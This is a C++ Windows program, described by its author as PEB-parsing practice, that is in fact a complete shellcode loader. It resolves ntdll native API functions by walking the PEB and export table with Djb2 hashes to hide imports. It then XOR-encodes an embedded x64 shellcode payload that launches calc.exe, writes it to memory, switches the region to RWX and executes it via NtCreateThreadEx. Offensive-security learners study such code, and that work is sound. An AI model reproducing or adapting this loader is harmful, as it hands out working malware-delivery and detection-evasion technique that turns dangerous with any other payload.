/*
This program is designed to help me practice parsing the PEB and other critical data structures to find and manipulate data as needed
*/
// Includes
#include <wchar.h>
#include <Windows.h>
#include <winnt.h>
#include <intrin.h>
#include <iostream>
#include <winternl.h>
#include "Djb2.h"
#include "XOR.h"

#define NTDLL_HASH 0xa58d6fbb // ntdll.dll
#define NTALLOCATEVIRTMEM_HASH 0xa0d6f67a  // NtAllocateVirtualMemory
#define NTWRITEVIRTMEM_HASH 0x404f3660 // NtWriteVirtualMemory
#define NTPROTECTVIRTMEM_HASH 0xcc9c6636 // NtProtectVirtualMemory
#define NTCREATETHREADEX_HASH 0x6c2195e // NtCreateThreadEx

//Globals
LPVOID g_ntBase = NULL; // ntdll.dll
PVOID g_ntAlloc = NULL; // NtAllocateVirtualMemory
PVOID g_ntWrite = NULL; // NtWriteVirtualMemory
PVOID g_ntProtect = NULL; // NtProtectVirtualMemory
PVOID g_ntThread = NULL; // NtCreateThreadEx

// Payload - .data
unsigned char calc[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

DWORD ntWalker() {
#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = __readfsdword(0x30);
#else
#error Unsupported Platform
#endif

	//TODO: Define Necessary structures for NTAPI Calls
	typedef struct _PS_ATTRIBUTE
	{
		ULONG_PTR Attribute;
		SIZE_T Size;
		union
		{
			ULONG_PTR Value;
			PVOID ValuePtr;
		};
		PSIZE_T ReturnLength;
	} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

	typedef struct _PS_ATTRIBUTE_LIST
	{
		SIZE_T TotalLength;
		PS_ATTRIBUTE Attributes[1];
	} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

	typedef enum _PS_CREATE_STATE
	{
		PsCreateInitialState,
		PsCreateFailOnFileOpen,
		PsCreateFailOnSectionCreate,
		PsCreateFailExeFormat,
		PsCreateFailMachineMismatch,
		PsCreateFailExeName, // Debugger specified
		PsCreateSuccess,
		PsCreateMaximumStates
	} PS_CREATE_STATE;

	typedef struct _PS_CREATE_INFO
	{
		SIZE_T Size;
		PS_CREATE_STATE State;
		union
		{
			// PsCreateInitialState
			struct
			{
				union
				{
					ULONG InitFlags;
					struct
					{
						UCHAR WriteOutputOnExit : 1;
						UCHAR DetectManifest : 1;
						UCHAR IFEOSkipDebugger : 1;
						UCHAR IFEODoNotPropagateKeyState : 1;
						UCHAR SpareBits1 : 4;
						UCHAR SpareBits2 : 8;
						USHORT ProhibitedImageCharacteristics : 16;
					};
				};
				ACCESS_MASK AdditionalFileAccess;
			} InitState;

			// PsCreateFailOnSectionCreate
			struct
			{
				HANDLE FileHandle;
			} FailSection;

			// PsCreateFailExeFormat
			struct
			{
				USHORT DllCharacteristics;
			} ExeFormat;

			// PsCreateFailExeName
			struct
			{
				HANDLE IFEOKey;
			} ExeName;

			// PsCreateSuccess
			struct
			{
				union
				{
					ULONG OutputFlags;
					struct
					{
						UCHAR ProtectedProcess : 1;
						UCHAR AddressSpaceOverride : 1;
						UCHAR DevOverrideEnabled : 1; // from Image File Execution Options
						UCHAR ManifestDetected : 1;
						UCHAR ProtectedProcessLight : 1;
						UCHAR SpareBits1 : 3;
						UCHAR SpareBits2 : 8;
						USHORT SpareBits3 : 16;
					};
				};
				HANDLE FileHandle;
				HANDLE SectionHandle;
				ULONGLONG UserProcessParametersNative;
				ULONG UserProcessParametersWow64;
				ULONG CurrentParameterFlags;
				ULONGLONG PebAddressNative;
				ULONG PebAddressWow64;
				ULONGLONG ManifestAddress;
				ULONG ManifestSize;
			} SuccessState;
		};
	} PS_CREATE_INFO, *PPS_CREATE_INFO;

	//TODO: Define function prototypes for Nt functions
	// NtAllocateVirtualMemory
	typedef NTSTATUS(NTAPI* pNtAllocateVirtualMem)(
		HANDLE		ProcHandle,
		PVOID* BaseAddress,
		ULONG_PTR	ZeroBits,
		PSIZE_T		RegionSize,
		ULONG		AllocationType,
		ULONG		Protect
		);

	// NtWriteVirtualMemory
	typedef NTSTATUS(NTAPI* pNtWriteVirtualMem)(
		HANDLE		ProcHandle,
		PVOID		BaseAddress,
		PVOID		Buffer,
		SIZE_T		NumOfBytesToWrite,
		PSIZE_T		NumOfBytesWritten
		);

	// NtProtectVirtualMemory
	typedef NTSTATUS(NTAPI* pNtProtectVirtualMem)(
		HANDLE		ProcHandle,
		PVOID* BaseAddress,
		PSIZE_T		RegionSize,
		ULONG		NewProtection,
		PULONG		OldProtection
		);

	// NtCreateThreadEx
	typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
		PHANDLE				ThreadHandle,
		ACCESS_MASK			DesiredAccess,
		POBJECT_ATTRIBUTES	ObjectAttributes,
		HANDLE				ProcessHandle,
		PVOID				StartRoutine,
		PVOID				Argument,
		ULONG				CreateFlags,
		SIZE_T				ZeroBits,
		SIZE_T				StackSize,
		SIZE_T				MaximumStackSize,
		PPS_ATTRIBUTE_LIST	AttributeList
		);

	// TODO: Walk Ldr Doubly Linked List
	PPEB_LDR_DATA pLdr = pPeb->Ldr;
	PLIST_ENTRY pLdrListEntry = &pLdr->InMemoryOrderModuleList;
	PLIST_ENTRY pCurr = pLdrListEntry->Flink;
	while (pCurr != pLdrListEntry) {
		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		PWCHAR fullPath = pEntry->FullDllName.Buffer;
		PWCHAR fileName = wcsrchr(fullPath, L'\\');
		fileName = (fileName != nullptr) ? fileName + 1 : fullPath;
		DWORD dllHash = Djb2HashMaker(fileName);
		if (dllHash == NTDLL_HASH) {
			g_ntBase = pEntry->DllBase;
			break;
		}
		pCurr = pCurr->Flink;
	}
		
	// Error checking
	if (g_ntBase == NULL) {
		std::cerr << "Module Base Address is still null/invalid" << std::endl;
		return -1;
	}
	else {
		std::wcout << L"Found Module!" << std::endl;
		std::cout << "Module Address: 0x" << std::hex << g_ntBase << std::endl;
	}
	/*
	/////////////IMAGE DOS HEADER///////////////
	*/
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)g_ntBase;
	// Sig Check
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cerr << "Invalid DOS Signature!" << std::endl;
		return -1;
	}
	std::cout << "DOS Signature: 0x" << pImgDosHdr->e_magic << std::endl;

	/*
	/////////////IMAGE NT HEADER///////////////
	*/
	// NT HEADER = Base + DOS_HDR->e_lfanew
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)g_ntBase + pImgDosHdr->e_lfanew);
	// Sig Check
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		std::cerr << "Invalid NT Signature!" << std::endl;
		return -1;
	}

	/////////////IMAGE OPTIONAL HEADER///////////////
	PIMAGE_OPTIONAL_HEADER pImgOptHdr = &pImgNtHdr->OptionalHeader;

	/*
	typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA from base of image
    DWORD   AddressOfNames;         // RVA from base of image
    DWORD   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
*/
	PIMAGE_EXPORT_DIRECTORY pNtExpDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)g_ntBase + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // EAT
	// TODO: Walk the EAT
	// Define Array Pointers for Function Names | Function Addresses | Function Ordinal Numbers
	PDWORD fnNameArray = (PDWORD)((PBYTE)g_ntBase + pNtExpDir->AddressOfNames);
	PDWORD fnAddrArray = (PDWORD)((PBYTE)g_ntBase + pNtExpDir->AddressOfFunctions);
	PWORD fnOrdinalArray = (PWORD)((PBYTE)g_ntBase + pNtExpDir->AddressOfNameOrdinals);

	for (DWORD i{ 0 }; i < pNtExpDir->NumberOfFunctions; i++) {
		CHAR* pFuncName = (CHAR*)((PBYTE)g_ntBase + fnNameArray[i]);
		WORD wFuncOrdinal = fnOrdinalArray[i];
		PVOID pFuncAddr = (PVOID)((PBYTE)g_ntBase + fnAddrArray[wFuncOrdinal]);
		wchar_t wideName[256];
		MultiByteToWideChar(CP_UTF8, 0, pFuncName, -1, wideName, 256);
		// Djb2 Hash each function name
		DWORD fnHash = Djb2HashMaker(wideName);
		if (fnHash == NTALLOCATEVIRTMEM_HASH) {
			g_ntAlloc = pFuncAddr;
		}
		else if (fnHash == NTWRITEVIRTMEM_HASH) {
			g_ntWrite = pFuncAddr;
		}
		else if (fnHash == NTPROTECTVIRTMEM_HASH) {
			g_ntProtect = pFuncAddr;
		}
		else if (fnHash == NTCREATETHREADEX_HASH) {
			g_ntThread = pFuncAddr;
		}
		else {
			continue;
		}
	}
	if (g_ntAlloc == NULL || g_ntProtect == NULL || g_ntWrite == NULL || g_ntThread == NULL) {
		std::cerr << "Memory addresses were not populated successfully" << std::endl;
	}
	// TODO: Cast function addresses to their respective call structures as manually defined above
	pNtAllocateVirtualMem NtAlloc =		(pNtAllocateVirtualMem)g_ntAlloc;
	pNtWriteVirtualMem NtWrite =		(pNtWriteVirtualMem)g_ntWrite;
	pNtProtectVirtualMem NtProtect =	(pNtProtectVirtualMem)g_ntProtect;
	pNtCreateThreadEx NtThread =		(pNtCreateThreadEx)g_ntThread;

	// Init Vars for NT syscalls
	NTSTATUS Status = 0x00;
	ULONG uOldProtect = NULL;
	SIZE_T szPayloadSize = sizeof(calc);
	SIZE_T szNumBytesWritten = NULL;
	HANDLE hThread = NULL;
	PVOID pAddress = NULL;

	// XOR Payload - Now
	PBYTE pEncryptedPayload = XorPayload(calc, szPayloadSize, 0x9A); // Change key per run

	// Call NtAllocateVirtualMemory
	NTSTATUS status = NtAlloc(GetCurrentProcess(),
		&pAddress,
		0,
		&szPayloadSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);
	if (NT_SUCCESS(status)) {
		std::cout << "Memory Allocated at: 0x" << std::hex << pAddress << std::endl;
	}
	else {
		std::cerr << "NtAllocateVirtualMemory Failed with error: 0x" << std::hex << status << std::endl;
	}
	
	// Call NtWriteProcessMemory
	NTSTATUS status_write = NtWrite(GetCurrentProcess(), pAddress, pEncryptedPayload, szPayloadSize, &szNumBytesWritten);
	if (NT_SUCCESS(status_write)) {
		std::cout << "Successfully wrote: " << szPayloadSize << " bytes to memory" << std::endl;
	}
	else {
		std::cerr << "NtWriteProcessMemory failed with error: 0x" << std::hex << status_write << std::endl;
	}

	// Call NtProtectVirtualMemory
	NTSTATUS status_prot = NtProtect(GetCurrentProcess(), &pAddress, &szPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
	if (NT_SUCCESS(status_prot)) {
		std::cout << "Successfully updated memory permissions to RWX" << std::endl;
	}
	else {
		std::cerr << "NtProtectVirtualMemory failed with error: 0x" << std::hex << status_prot << std::endl;
	}

	std::cout << "Press Enter to decrypt and execute payload..." << std::endl;
	getchar();
	XorPayload((unsigned char*)pAddress, szPayloadSize, 0x9A);

	// Call NtCreateThreadEx
	NTSTATUS status_thread = NtThread(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(status_thread)) {
		std::cerr << "NtCreateThreadEx failed with error: 0x" << std::hex << status_thread << std::endl;
	}

	WaitForSingleObject(hThread, INFINITE);
}

INT main(VOID) {

	ntWalker();
}